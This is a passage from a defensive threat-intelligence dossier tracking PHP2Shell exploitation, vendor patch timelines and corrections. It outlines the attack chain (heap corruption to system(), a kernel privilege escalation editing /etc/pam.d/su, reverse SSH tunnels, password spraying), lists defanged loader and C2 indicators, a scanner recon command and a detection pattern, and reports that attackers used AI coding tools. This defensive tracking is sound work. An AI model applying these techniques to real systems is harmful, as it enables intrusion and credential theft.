Conditions 3 to 5 are application behaviours, not PHP defaults. Most frameworks call `session_start()`, but
few expose a `session_decode`/append surface and a reflected session value together.

### 53.3 Verification attempts
- **Upstream CI:** `ci.yml` runs lint, unit tests and profile schema validation only. `live-fpm.yml` (the
  workflow that would build PHP and run the RCE integration tests) is `workflow_dispatch` only and has
  **0 runs**. The "Live FPM lab" badge in the README is decorative, not evidence.
- **Our lab:** assembled nginx + official `php:8.4.26-fpm` image, served the repo's own `app.php`, `ref.php`,
  `grow.php`; the client's `probe` passed every precondition and the amplified `session_decode` arm was
  reached. Three `leak` attempts and one `no-oracle` attempt then failed with
  `HTTP leak failed (all reads short or invalid)`. Our stack is not the author's (official Docker build, our
  own pool config), so this is **not disproof**. It is also **not confirmation**.

### 53.4 Position
**Unverified, prerequisites heavy, and not a reason to change the exposure shape yet.** Our stated shape
(mod_php + prefork confirmed; FPM unconfirmed) stands. Watch item: whether independent researchers reproduce
it, whether the author's live-lab workflow runs, or whether a variant drops the application prerequisites.
If an independent reproduction appears, the shape statement changes immediately.


### 53.5 Retest after the author's leak fix (27 Oct 22:38 UTC commit) — still unverified
New commit **`213d63a`** *"Leak tiling, 7.4 chain verification, and lab hardening"* explicitly addresses
**the failure mode we hit**: the leak buffer is now tiled with the read length instead of a single calibrated
header, so a freed short string landing anywhere inside it carries a sane length. It also claims **PHP 7.4.33
verified end to end** and raises the coverage to 7.4 plus all 8.x. Upstream `live-fpm` still has **0 runs**;
`ci.yml` still only lints and unit-tests (24 runs, none executing the exploit).

**Retest with the updated client, same Docker lab (official `php:8.4.26-fpm`):** probe passed every
precondition and the arm was reached, 22 arm requests, then the same
`HTTP leak failed (all reads short or invalid)`. Two client versions, same result.

**Most likely explanation:** the shipped profiles are calibrated to the author's Debian-style **user-prefix
PHP build**, not the official Docker image. The chain depends on heap geometry, so a different build can move
it outside the calibrated shapes. That is a lab-difference explanation, not a refutation, and it means we
still cannot call FPM confirmed. A fair reproduction would build PHP the same way the author does, or use the
lab's own `calibrate` against the Docker build (which the client supports).

**Status: UNVERIFIED.** Affected builds claim now includes 7.4.33. Exposure shape unchanged.


## 54. Product-scope addition (2026-10-28) — Siemens RUGGEDCOM APE1808 (PAN-OS host)

**Trigger:** NVD's 28 October modification of both CVEs added Siemens CPE configurations
(`cpe:2.3:o:siemens:ruggedcom_ape1808_firmware` and the hardware CPE) alongside the PHP CPEs. That makes
industrial edge devices visible to CPE-based scanners, so the product scope needed checking.

**Source:** Siemens advisory **SSA-566512** *"PHP2Shell Vulnerabilities in Palo Alto Networks PAN-OS on
RUGGEDCOM APE1808 Devices"*, published 2026-10-23, V1.0, CVSS v3.1 9.8 / v4.0 9.2. It lists **RUGGEDCOM
APE1808 with PAN-OS, all versions** affected across **10.2, 11.1, 11.2, 12.1 and 12.2** branches, and points
to the PAN-OS advisories for remediation. No separate Siemens firmware fix in V1.0.

**Reading:** this is not a fourth independent PHP runtime. It is a PAN-OS host in an industrial form factor,
so the PAN-OS fix chain applies and the APE1808 follows its branch's release. It also means "patch your
PAN-OS management plane" guidance should include OT estates hosting PAN-OS on APE1808, where change windows
are slower.

**Coverage:** added to `PATCH-AVAILABILITY.md` §8c and `START-HERE.md` appliance line.


## 55. PAN-OS: three more hotfixes released (advisory timeline 2026-10-28)

### 55.1 What shipped
The advisory's 28 October timeline entry: *"Removed ETAs for 11.2.7-h23, 11.2.13-h4 and 11.2.16-h1 as
these versions are released."* Released total is now **14 of 20 builds**:

- 25 Oct: `10.2.18-h13`, `11.1.16-h4`, `11.2.10-h16`
- 26 Oct: `11.1.4-h38`, `11.1.6-h40`, `11.1.10-h36`, `11.1.13-h16`
- 27 Oct: `10.2.13-h27`, `10.2.16-h12`, `12.1.7-h11`, `12.2.4-h1`, plus the three announced above

Remaining **6**, all with 29–30 Oct ETAs: `12.1.4-h13`, `12.1.10-h3`, `11.1.7-h12`, `11.2.4-h23`,
`10.2.7-h39`, `10.2.10-h42`. **Panorama still has no fix date.** `11.2.13-h4` thus shipped one day after
its own 27 Oct ETA, consistent with the docs-first pattern rather than a plan change.

### 55.2 `11.2.10-h17` note
The advisory FAQ states the same hotfix covers both the PHP and Brotli vulnerabilities, with the exception
that `11.2.10-h16` contains the PHP fix only while `11.2.10-h17` contains both. If an estate also tracks the
Brotli KEV entry (`CVE-2026-111497`, added 27 Oct), `h17` is the build that clears both.

### 55.3 Monitor defect found and fixed
Our released-build parser required the phrase "removed **the** ETAs for". The 28 October entry drops "the",
so the three builds were counted as pending while the advisory already listed them as released. The
`pan.pending_fix_rows` and `pan.timeline_latest` changes exposed the discrepancy, and the ALERTS block
flagged the corrected released list after the fix. Parser now accepts the optional "the".


### 55.4 Independent corroboration (28 Oct): NCSC-NL mirrors the split
NCSC-NL's software status list (updated 28 Oct 11:14 CET) now states the same PAN-OS thresholds: fixed in
`12.2.4-h1`, `12.1.7-h11`, `11.2.7-h23`, `11.2.10-h16`, `11.2.13-h4`, `11.2.16-h1`, `11.1.4-h38`,
`11.1.6-h40`, `11.1.10-h36`, `11.1.13-h16`, `11.1.16-h4`, `10.2.13-h27`, `10.2.16-h12`, `10.2.18-h13`,
with ETAs for the remaining six (`12.1.4-h13`, `12.1.10-h3`, `11.2.4-h23`, `11.1.7-h12`, `10.2.7-h39`,
`10.2.10-h42`). It also lists the Citrix NetScaler fixed versions we added to `PATCH-AVAILABILITY.md` §8c.
Useful as a second CSIRT source for the same table, not a new fact.


## 56. CORRECTION (2026-10-28) — Panorama is fixed by the same PAN-OS maintenance releases

### 56.1 What we had wrong
Since 23 October our material said **"Panorama: affected, no fix date"** (§45.3 kept it after the WF-500
correction). That was a misreading of an omission: the advisory publishes **one shared hotfix table** and has
**no separate Panorama row**, which we interpreted as "no Panorama fix exists".

### 56.2 What the sources say
- **PAN advisory:** the product note reads *"This issue is applicable to PAN-OS software on PA-Series and
  VM-Series firewalls **and on Panorama (virtual and M-Series)**."* The Solution table lists the PAN-OS
  branches and hotfixes; Panorama runs PAN-OS software and upgrades on the same version numbering
  (`11.2.4-h23`, `11.1.7-h12`, `10.2.7-h39`, and so on).
- **Independent reading:** Brandefense's status summary (28 Oct) states *"The advisory lists PAN-OS and
  Panorama in one row with one set of hotfixes."* NCSC-NL PR #54 applies the same fixed versions to both its
  PAN-OS (`PHP-0623`) and Panorama (`PHP-0625`) entries and moves both to status **Fix**; its software list
  row dated 28 Oct 11:14 gives Panorama the same fixed thresholds we publish for PAN-OS.

### 56.3 Corrected statement
**Panorama is affected and fixed by the same maintenance releases as PAN-OS.** Upgrade Panorama to the same
hotfix as its train when available; it is not waiting for a separate vendor date. The interim
management-access restrictions still apply to Panorama until it is upgraded, and to the six PAN-OS builds
still pending.

### 56.4 Where corrected
`PATCH-AVAILABILITY.md` §7b (two places), `START-HERE.md` (two places), `PAN-OS-EXPOSURE.md` (four places),
dossier §56, the public page status line, and a public `[assessment]` entry.

### 56.5 Process note
This is a reading correction, not a vendor change: no PAN advisory revision moved Panorama. The failure mode
was treating a missing row as a negative fact. Standing rule: when a vendor publishes a single shared fix
table plus an applicability note naming extra products, apply the table to those products unless a **separate
row** contradicts it.


## 57. Cisco advisory v1.8 (2026-10-27): URWB fix slipped to March 2027, ISE Portal Builder listed

### 57.1 What changed
Cisco's advisory `cisco-sa-php-october26-Jj384Daq` is now **version 1.8, last updated 27 October 2026
20:49 GMT** (we had cited the 26 Oct revision). Two changes matter:

1. **Ultra-Reliable Wireless Backhaul (URWB)**: fixed release **27.1.1 now planned March 2027**, not
   February 2027. Bug CSCwx37073. Exploitation requires administrator authentication, CVSS 6.6, workaround
   documented in the bug.
2. **Identity Services Engine (ISE) Portal Builder**: now listed as affected with the remedy
   **"Offline for remediation"** and no fixed release. No bug ID is published for it in the table;
   workarounds are referenced from the advisory.

Unchanged: Expressway Series / Select Series fix **15.5.21** with no date, and Duo Access Gateway fixed in
**3.2.0**.

### 57.2 Why it matters
Our `PATCH-AVAILABILITY.md` §8c said URWB was planned for February; that date has moved a month later, and a
product we were not listing at all (ISE Portal Builder) is now affected. Neither changes exposure for
PHP-runtime estates, but both matter to anyone using the Cisco table for scheduling.

### 57.3 Process gap
Our monitor does not watch the Cisco advisory; the change surfaced because NCSC-NL's software list began
listing Cisco ISE and URWB rows and I checked the primary source. Cisco publishes "Last Updated" plus a
version number, so it is tractable to watch. Candidate for the monitor: parse `Last Updated` and the URWB /
ISE rows. Not yet implemented.


## 58. Cisco advisory v1.9 (2026-10-28 16:48 GMT): URWB fix accelerated to November 2026

### 58.1 The change
One hour after we corrected our Cisco table to v1.8's **March 2027** URWB date, Cisco published **v1.9**
(28 Oct 16:48 GMT). It moves the Ultra-Reliable Wireless Backhaul fixed release **27.1.1 from March 2027 to
November 2026**, a four-month acceleration. ISE Portal Builder remains "offline for remediation"; Expressway
Series remains on 15.5.21 with no date; Duo Access Gateway remains fixed in 3.2.0.

Verified directly from the advisory: *"Last Updated: 2026 October 28 16:48 GMT Version 1.9"* and the row
`CSCwx37073 | 27.1.1 (Nov 2026)`.

### 58.2 Monitor change that caught it
The v1.8 lag was found manually (via NCSC-NL rows). Within the same hour I added a Cisco advisory section to
`check.sh` (section 7c): it parses `Last Updated` + version, the URWB and Expressway fixed-release rows, and
the ISE row status, and the ALERTS block now fires on any version change. Its first live run caught v1.9 and
the URWB acceleration before any other source reflected it.

### 58.3 Lesson
Two vendor revisions in 24 hours, with a four-month date swing between them. Single-source, one-shot vendor
reads age badly; a version-and-date watch is cheap and this one immediately paid. Treat any planned release
date in customer material as an estimate with the revision number attached.


## 59. 🚨 FIRST REAL-WORLD VICTIM REPORT (2026-10-27/28) — Dream Group: 25 rooted appliances

### 59.1 Source and provenance
**Dream Group** (Israeli security firm) published *"Chained PHP2Shell Exploit Roots 25 Servers, including US
Government Servers"* on 27 Oct 2026 17:02 UTC, based on artifacts discovered 25 Oct. The Hacker News covered
it on 28 Oct 17:59 GMT. Primary source: `dreamgroup.com/blog/chained-php2shell-exploit-roots-25-servers`.
**No IOCs were published** (vendor and versions withheld); the vendor was notified. Single-source,
vendor-reported, **not independently verified by us.**

### 59.2 What it claims
- **25 servers rooted** across the **United States, Japan, Taiwan and South Korea**, including **three in a
  US government-affiliated environment** (two perimeter firewalls plus an internal firewall management
  server). Persistent access to that organisation's **internal Active Directory domain**.
- Affected devices run **specific versions of a large vendor's firewall software**; vendor and versions are
  **withheld**. Stated specifics: the firewall OS runs **PHP 8.0.30** with a high memory limit, and the
  target is the **`session.upload_progress` mechanism on the firewall's appweb management server**.
- Exploit: a **custom, non-public build** of the PHP2Shell chain (not a copy of any public exploit),
  four stages mirroring the public technique (A1 memory exhaustion ~383 MB, B1 out-of-bounds leak via
  `Set-Cookie`, A2 stale reference setup ~500 MB, B2 forged HashTable with `pDestructor` = `zif_system`),
  giving code execution as `nobody`. All in a **single B2 request**, chain completing in under 15 minutes.
- Privilege escalation: **Fragnesia (CVE-2026-46300)**, a Linux kernel LPE in the XFRM ESP-in-TCP subsystem,
  using page-cache writes to replace `/etc/pam.d/su` with `pam_permit.so` (774-byte file, per-byte
  splicing). SELinux `httpd_t` confinement is why the second stage was needed.
- Campaign funnel: FOFA ~**19,000** exposed firewalls, ~**5,000** alive with versions, filtered to the four
  countries and PHP 8.0.30 branches → **240 targets**; automated batch runner (5 concurrent, 30-minute
  timeout) → **24 rooted**; two US-government firewalls triaged, second exploited 24 Oct 10:09 UTC; group
  root 25 with the internal management server at 11:35 UTC. **22 other firewalls remain parked with a
  103-byte PHP root web shell**, described as likely still active.
- Post-exploitation: 8-port **reverse SSH tunnel** (LDAP, LDAPS, RDP, internal management, VPN, SOCKS5),
  persisted via systemd unit plus `rc.local`; LDAP service account password **decrypted from device
  config** (root gives the master key); full AD user/group enumeration; **password spray with
  `lockoutThreshold=0`**; attempted backdoor user and machine accounts; AD ACL analysis; attempted SAML
  signing-key extraction from Keycloak and SSO bypass probing. Outcome of spray/backdoor creation/SAML key
  extraction **unknown** (results stayed on the management server's filesystem).
- Attribution: **suspected China-nexus**, not a named actor. Indicators: target countries, FOFA, Chinese
  `iox` tunnelling utility, DeepSeek and Kimi LLMs configured in an "aiscan" offensive platform, UTC+8
  infrastructure clocks, Chinese-language prompts. Claimed AI-assisted development across ~40 scripts
  (Claude Code installed, code style consistent), with the caveat that direct evidence of AI writing the
  exploit is absent.

### 59.3 What it changes
1. **Victim position changes from "none" to "vendor-reported government-affiliated compromise".** No
   organisation has named itself, and Dream withholds the firewall vendor, so it is still not a publicly
   named victim. It is no longer true to say no compromise has been reported.
2. **In-the-wild exploitation used a custom exploit, not public PoC.** This reconciles two earlier
   observations: the public tool is unreliable against real builds (our benchmark), and the recovered
   profiles store per-version offsets, SHA-256 hashes and ELF build IDs from `libphp.so`. Actors who invest
   in per-version calibration are not limited by public PoC quality.
3. **Appliance management planes are the confirmed attack surface in the real world.** This is the threat
   model we flagged for PAN-OS, Citrix and Cisco, now demonstrated on an undisclosed firewall vendor with
   PHP 8.0.30 and appweb.
4. **Chained LPEs matter.** PHP2Shell gave `nobody`; `Fragnesia` (CVE-2026-46300) gave root. Patching PHP
   alone would not have prevented root on those appliances unless the kernel was also patched.

### 59.4 What it does not change
- No named organisation, no vendor name, no IOCs, no hashes, no IPs. Triage cannot rely on this report for
  matching.
- Our benchmarked capability statement stands: public tool single-worker 100%, multi-worker 15%; the
  attacker's success came from custom offsets and a favourable target profile.
- Fragnesia is **not in CISA KEV** (catalog 2026.10.27); our two CVEs remain listed, due 29 Oct.
- The Unit 42 retraction (25 Oct) remains retracted. This Dream report is a different claim, from a different
  source, about a different (undisclosed) environment.

### 59.5 Our exposure reading
Any internet-exposed management interface on an appliance that bundles PHP 8.0.30 (or another affected
build) is now a demonstrated path to root, with a second kernel bug needed for privilege escalation. The
defensive actions are the ones already in our PAN-OS guidance, plus appliance-specific checks: look for PHP
web shells in web-accessible directories, reverse SSH tunnels persisted via systemd or `rc.local`,
unexpected `/etc/pam.d/su` content, AD enumeration and sprays originating from appliance management
servers, and SAML IdP key access. Detection guidance is in
`04-hunting/incident-firewall-root-2026-10-25.md`.


## 60. UPDATE (2026-10-28) — Fragnesia (CVE-2026-46300) added to CISA KEV, due 31 Oct

### 60.1 The change
CISA added **CVE-2026-46300** (Linux Kernel, "missing initialization of a variable" allowing unintended
modification of page-cache-backed data via socket-buffer coalescing and ESP input processing) to KEV on
**2026-10-28**, with a **2026-10-31** remediation due date (catalog 2026.10.28, 1,762 entries). This is the
kernel LPE that Dream Group reported chained after PHP2Shell to gain root on 25 rooted appliances (§59).

### 60.2 What it corrects
§59 recorded "Fragnesia is not in CISA KEV" (true when written, catalog 2026.10.27). That is now wrong.

### 60.3 Why it matters
**Both halves of the observed real-world chain are now KEV-listed:**
- PHP2Shell (CVE-2026-109618 / CVE-2026-109619), added 26 Oct, due **29 Oct**.
- Fragnesia (CVE-2026-46300), added 28 Oct, due **31 Oct**.

For appliance estates this closes a gap in urgency: patching the PHP runtime does not remove the root stage.
The kernel fix is a separate, now-deadline-bound action. The KEV description matches the technique Dream
described (page-cache modification), which is independent corroboration that the kernel bug is the one used,
though not verification of the victim claim itself.


## 61. PUBLIC ECOSYSTEM ASSESSMENT (2026-10-28) — ikow repo: 5 chains, botnet delivery, new IOCs

### 61.1 What the repo is
`ikow/php2shell-poc` (MIT, created 21 Oct, **1,889 stars, 642 forks**, 2.7 MB, Python) describes itself as
"CVE-2026-109618/109619: 5 RCE chains + detection rules". It is now the most visible public research repo,
and it also aggregates wild-activity reporting. **We have not tested its chains.**

### 61.2 The five chains (as claimed)
| Chain | Vector | Pre-auth | Conditions | SAPI |
|---|---|---|---|---|
| A | Session injection + LFI | Yes | App has an LFI sink | All |
| B | var_destroy UAF then handler overwrite | No | App calls `unserialize()` | All |
| C | Handler mismatch then `__destruct` | Yes | Two dirs with different serialize_handler | FPM |
| **D** | **OOM corruption then stale `EG()`** | **Yes** | **None, any endpoint** | **mod_php** |
| **E** | **FPM session OOM then stale `BG()`** | **Yes** | Producer: any `session_start()` endpoint; Consumer: any endpoint | **FPM** |

Chain D is the concerning one: it claims **zero-dependency pre-auth RCE on Apache mod_php**. Chain E claims
near-universal FPM applicability. If true, our benchmarked shape (Joas tool, mod_php+prefork, needs
upload_progress) understates the public capability. Two independent projects now claim FPM RCE (this and
VABISMO, §53), which we still have not reproduced.

### 61.3 Mitigation nuance we had too strong
Our line was "`session.upload_progress.enabled=0` breaks the path". The repo's own mitigation section agrees
it blocks the primary upload vector, but states the **Zend-engine OOM corruption (Chain D) has no INI fix**;
patching is the only complete fix. Corrected in START-HERE: the INI setting reduces attack surface, the PHP
patch is the complete fix.

### 61.4 Wild activity it aggregates
- **Potassium**, a Mirai-derived DDoS botnet, delivered via php2shell from **22 Oct**, per Nokia Deepfield
  and Sophos. Loader host `92.118.112[.]100` (`/nfs-setup` x86, `/mountpoint` ARM), C2 `134.199.154[.]64`
  and `thunder[.]godofthunder[.]st`, secondary payload `/cCmono`. Two payload SHA-256s listed.
- **Request signatures:** UA `php2shell-scan/109618`, `php2shell-test/2.0.0`; **new boundary
  `----p2shell`**; default command `uname -a; id; echo JACKALPOC`.
- **Scanning sources** (Wordfence): nine IPs.
- Its tracker also lists the two 0x4D31 honeypot source clusters (`15.204.59[.]70`, `162.35.99[.]94`),
  attributed to Wiz. Cross-source agreement on the same clusters.
- "Downstream pre-auth RCE confirmed" list: WordPress, Joomla, Drupal, Magento, Laravel, Roundcube,
  phpMyAdmin, Nextcloud, Symfony, MediaWiki, WooCommerce, Shopware, WHMCS. Aggregated from Wiz and others,
  **not verified by us**.

### 61.5 What we adopted
- New hunting doc `04-hunting/potassium-botnet-php2shell-2026-10-28.md` with defanged IOCs, Potassium wire
  behaviour (XOR 0xED, fixed header, port pools, process names `dvrLocker`/`dvrInside`, TCP 1234, C2 50792)
  and hunting queries.
- Seven new Suricata rules (34 total): scanner UAs, `----p2shell` boundary, loader URLs, C2 domains.
- One new Sigma rule (7 total): Potassium process names.
- Monitor tracks the repo and its exploitation tracker for changes.

### 61.6 What we did not adopt
Its exploit code and detection rule bodies. We built our own signatures from the described behaviour. Its
chain claims remain unverified; testing five chains is a larger lab effort than the single-tool benchmark we
ran.


## 62. PAN-OS fixes nearly complete (2026-10-29): 19 of 20 builds released, one pending

### 62.1 What shipped
Advisory timeline, 29 Oct: *"Removed ETAs for 10.2.7-h39, 10.2.10-h42, 11.2.4-h23, 12.1.4-h13 and 12.1.10-h3
as these versions are released."* Released total **19 of 20**. Only **`11.1.7-h12`** remains pending, with an
ETA of **30 Oct**.

Released by wave:
- 25 Oct: `10.2.18-h13`, `11.1.16-h4`, `11.2.10-h16`
- 26 Oct: `11.1.4-h38`, `11.1.6-h40`, `11.1.10-h36`, `11.1.13-h16`
- 27 Oct: `10.2.13-h27`, `10.2.16-h12`, `12.1.7-h11`, `12.2.4-h1`
- 28 Oct: `11.2.7-h23`, `11.2.13-h4`, `11.2.16-h1`
- 29 Oct: `10.2.7-h39`, `10.2.10-h42`, `11.2.4-h23`, `12.1.4-h13`, `12.1.10-h3`

**Panorama uses the same releases** (§56). **WF-500 / WF-500-B remain not affected.** Docs-first staging again
preceded this wave: three of these builds had release-notes pages live before publication.

### 62.2 What remains
One build, `11.1.7-h12`, ETA 30 Oct. Until it lands, 11.1.x estates below `11.1.16-h4` that cannot move branch
still need the interim controls. Everything else in scope can be upgraded today.


## 63. COMPETING CLAIM (2026-10-27/29) — "PHP-CGI pointer underflow" posted as CVE-2026-109618

### 63.1 The claim
A Full Disclosure post by "jose" (27 Oct, message 38; NVD added it as an untagged reference on 29 Oct,
taking refs to 9 and status to Modified) states that CVE-2026-109618 is **not** the OOM/longjmp corruption but a
**CGI SAPI pointer underflow** in `sapi/cgi/cgi_main.c`, same class as CVE-2019-11043, affecting all PHP 5.x to
8.4.26 with `cgi.fix_pathinfo=1`. It claims a four-stage chain (OOB read, fcgi_data_seg pointer leak,
write primitive, `.user.ini` `auto_prepend_file` injection), 9/9 automated tests, mitigation
`cgi.fix_pathinfo=0`, and states that disabling `session.upload_progress` does not mitigate it. It also says
several public "php2shell" PoCs actually exploit the upload_progress UAF, a different vulnerability. Its
detection suggestion is `%0a`/`%0d` in URI paths targeting `.php`.

### 63.2 What we verified
- **The underlying defect is real.** Upstream PR **php-src#23411** ("Fix path_info pointer underflow in CGI
  fix_pathinfo handling", author iliaal, base PHP-8.4) is genuine and explains that FPM received this guard in
  commit `ab061f95ca9` (CVE-2019-11043, 2019) while CGI did not.
- **It is not fixed in the 21 Oct security release as the post claims.** PR #23411 is **open and unmerged**
  (created 22 Aug). `sapi/cgi/cgi_main.c` has no path_info fix in its recent history; the 8.4.27 changelog has
  no CGI path_info entry. If PHP fixed it privately, the public record does not show it.
- **The CVE mapping is wrong or contested.** The official advisory for CVE-2026-109618 (GHSA-w8hw-w9fx-j79w)
  and the 21 Oct release describe OOM/`longjmp` request-cleanup corruption. KEV, the honeypot dataset and every
  exploitation report we track describe the `session.upload_progress`/OOM chain. Nothing in the primary
  advisory connects this CVE to a CGI `PATH_INFO` underflow.

### 63.3 Our position
1. Treat the post as describing **a real but separate, currently unassigned vulnerability** in the CGI SAPI,
   mislabeled with this CVE ID. The mislabel matters: its advice ("disabling upload_progress does not
   mitigate") is true for *that bug*, but false for the CVE as defined and exploited.
2. **Do not change the CVE mitigation.** Patch to 8.5.12/8.4.27/8.3.36/8.2.35, and keep
   `session.upload_progress` disabled where possible until the next PHP release.
3. **Add the precaution the post implies**, clearly labelled as defense-in-depth for an unpatched separate
   issue: if you run CGI or FPM with `cgi.fix_pathinfo=1` (the default), set **`cgi.fix_pathinfo=0`**. It is
   cheap, it removes a 2019-class path underflow surface, and it costs nothing operationally on modern
   application layouts.
4. **Detection:** `%0a`/`%0d` in a URI path targeting `.php` is a reasonable low-FP rule for the CGI issue.
   Added as SID `2202610134`.
5. **Do not cite the post's "884,000 exposed hosts" figure.** It is unsourced and does not distinguish the
   CGI bug from the CVE.

### 63.4 Monitoring
Added php-src PR #23411 state to the monitor (`php.cgi_pr23411=open|merged`), plus the Full Disclosure
thread hash. If the PR merges or a CVE is assigned to the CGI bug, that becomes a separate advisory and this
entry gets a follow-up. NVD reference count is now 9 (was 8) and status `Modified`; neither changes the
advisory facts.


## 64. CONFIRMATION (2026-10-29) — PAN-OS named, Unit 42 independently verified the campaign

### 64.1 What changed
Dream Group **updated its report on 29 October** (published 27 Oct, updated 29 Oct 18:02 UTC):
- The affected firewall vendor is now named: **Palo Alto Networks PAN-OS**. Dream says it is "collaborating
  on an investigation with Palo Alto Networks, the vendor of the firewall in question".
- **"Palo Alto Networks' Unit 42 has independently verified the attacker's tooling and results"** (Dream's
  wording). Palo Alto's own Unit 42 brief, updated **29 Oct 11:00 PT**, states: "Unit 42 has independently
  verified the same attacker's tooling and confirmed the reported results."
- Dream attributes the campaign to a Chinese-speaking attacker in **UTC+8** and says Unit 42 tracks it as
  **CL-UNK-1280** (we did not see that label on the Unit 42 page itself).
- Palo Alto's advisory now records **Exploitation Status: "Active exploitation has been observed targeting the
  Palo Alto Networks management interface exposed to the internet"** (TLP:AMBER, CVSS-BT 9.2 with E:A).
- Dream title now reads "Roots 25 Servers, including US Government Servers"; the report adds detail: PAN-OS
  management web server (**appweb**) also fronts the **GlobalProtect portal**; PAN-OS ships PHP 8; the actor
  profiled **9 PAN-OS versions** and calibrated memory geometry per version.
- 22 other firewalls remained web-shell-parked at the time of the report; PAN telemetry shows continued
  exploitation attempts.

### 64.2 What this resolves
- **Vendor question: resolved.** The earlier "undisclosed firewall vendor" is PAN-OS.
- **Independence question: resolved at the tooling level.** Two organisations (Dream, PAN Unit 42) now agree
  the recovered tooling and results are real. This is vendor verification, not a third-party audit.
- **Retraction nuance preserved:** Unit 42's **23 Oct European-government claim was retracted on 25 Oct** and
  is **not** the same finding as the PAN-OS campaign it verified on 29 Oct. Our §39.6 correction stands.

### 64.3 What remains open
- **No named victim organisation.** "US government-affiliated" is still the strongest description.
- **No IOCs in our hands.** Dream points to Palo Alto's website; the Unit 42 brief text we extracted contains
  no hashes or network indicators. Our hunting guide therefore stays technique-based, with vendor IOCs as a
  follow-up.
- The claim that Dream's report is "unverified" is now too strong for the tooling/results, and still correct
  for the victim claim. Wording in §59/§5d adjusted accordingly.

### 64.4 Why the naming matters commercially
It converts the question from "some firewall vendor might have a problem" into "**check your PAN-OS
management plane**". We had already covered PAN-OS exposure from 23 Oct (§44–§56, PATCH-AVAILABILITY §7b),
so the advisory did not need rebuilding, only the victim line and verification status.

## 65. PAN-OS FIXES COMPLETE (29 Oct): 20 of 20 builds released

Final build **`11.1.7-h12` was released on 29 October** (advisory timeline: "Removed ETAs for 11.1.7-h12 as
the version is released"). **No PAN-OS build remains pending.** Released across 25–29 Oct: 3 + 4 + 4 + 3 + 6
builds; see §62 for the list. Panorama covered by the same releases; WF-500/WF-500-B not affected.

The 29 Oct wave also carried the **Exploitation Status** line now present on the advisory ("Active
exploitation has been observed targeting the Palo Alto Networks management interface exposed to the
internet"). Until this point the exploitation evidence was CISA KEV plus third-party reporting; PAN now states
it on its own advisory.

## 66. NVD re-analysis closed (29 Oct) — CGI claim not adopted; KEV additions unrelated

- NVD returned CVE-2026-109618 from **Undergoing Analysis to Analyzed** (last modified 29 Oct 17:30 UTC). The
  **description is unchanged** (OOM/`longjmp` request-cleanup corruption). The Full Disclosure reference we
  examined in §63 is now tagged **"Mailing List"** rather than untagged, i.e. a discussion reference, not an
  endorsed description. Our §63 position stands.
- **KEV catalog 2026.10.29 (1,764, +2):** `CVE-2026-97229` (GitLab CE/EE, due 1 Nov) and `CVE-2026-76418`
  (Cisco Secure Firewall ASA/FTD, due 1 Nov). Neither is php2shell-related. Both CVE deadlines fall 1 Nov and
  are worth noting only as competing patch workload.
- **NVD sweep 62 → 95** over the ten-hour gap reflects NVD publication backlog, not a new PHP core CVE; our
  targeted check of 29–30 Oct PHP-keyword records found **no core PHP vulnerability**. No new PHP release
  either (php.version unchanged).


## 67. CYFIRMA advisory re-issue (24 Oct) — staging IOC set now captured

The CYFIRMA advisory (`CYF-EWR-2026-1022-PHP2SHELL-DPRK`, page grew to ~226 KB by 30 Oct) now carries the
indicator set that our earlier coverage lacked: **21 scan-node addresses added, 17 Version 2 addresses and 15
staging addresses still valid**, plus request-body hashes and operator tradecraft from a closed I2P channel.
Target set claimed at **581 hosts, expanded from the original 216** across 10 countries.

**Overlaps that raise confidence:** `92.118.112[.]100` is the Potassium loader host; `45.198.224[.]169` and
`85.11.167[.]243` appear in Wiz/Arctic Wolf reporting; `0c5486f0…` is the Arctic Wolf Potassium ARM payload.
**Caveat repeated by the advisory:** some hashes are of **HTTP request bodies, not files**, so they only match
byte-for-byte captures.

Added hunting doc `04-hunting/cyfirma-staging-2026-10-24.md` (defanged, provenance-labelled, caveated). Still
**suspected** infrastructure; attribution unverified by us; scanning is not compromise.


### 67.1 Update (30 Oct): advisory restructured into V1–V4; attribution upgraded
The CYFIRMA page now exposes four dated versions: **V1 (22 Oct, 27 infrastructure/C2 addresses)**, **V2 (23 Oct,
17 source IPs)**, **V3 (24 Oct, 21 scan-node addresses)** and **V4 (29 Oct, 24 current scan/staging addresses)**.
The V4 bottom line **upgrades attribution**: Korean-speaking operators, assessed **with high confidence as
North Korean (DPRK) state-nexus, Lazarus Group ecosystem**, dual financial and espionage mandate. Earlier
versions said "suspected". Target set claimed at **581 hosts, up from 216**.

Our hunting doc was rewritten around the advisory's own versioning, replacing a flattened list captured from an
earlier page revision. Hashes: earlier revision showed four, some explicitly **HTTP request-body hashes**; the
restructured page exposes fewer in text, so we no longer republish them and point to DeCYFIR instead.
